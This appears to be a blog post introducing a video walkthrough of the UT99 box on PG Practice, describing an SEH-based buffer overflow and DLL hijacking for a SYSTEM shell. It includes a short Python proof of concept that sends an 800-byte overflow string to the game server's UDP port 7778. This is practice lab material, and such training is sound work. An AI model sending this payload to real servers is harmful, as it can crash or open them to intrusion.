---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/sLXhzxiLZ4U/0.jpg
layout: post
media_subpath: /assets/posts/2021-09-09-seh-based-buffer-overflow-dll-hijacking-ut99-pg-practice
tags:
- binary exploitation
- dll hijacking
- pg practice
- seh buffer overflow
- windows
title: SEH Based Buffer Overflow & DLL Hijacking - UT99 @ PG Practice
---

We are solving UT99, an intermediate windows box on PG Practice. On this box, we are going to exploit an SEH based buffer overflow. And to make it a bit more fun we’ll do that one manually instead of just firing some exploit from exploitdb. Then for root, we will place a malicious DLL in the path of SYSTEM and reboot the box, which will result in a privileged shell.

{% youtube sLXhzxiLZ4U %}

## Notes

Below you can find a PoC to get you started in case you want to try it manually:

**PoC**

```python
import socket
from pwn import *

rserver = ""
lserver = ""
port = 7778
size = 800

r = remote(lserver, port, typ="udp")
r.send("\\basic\\")
log.info(r.recv())

buffer = b""
buffer += b"\\secure\\"
buffer += b"A"*size

r.send(buffer)
r.close()
```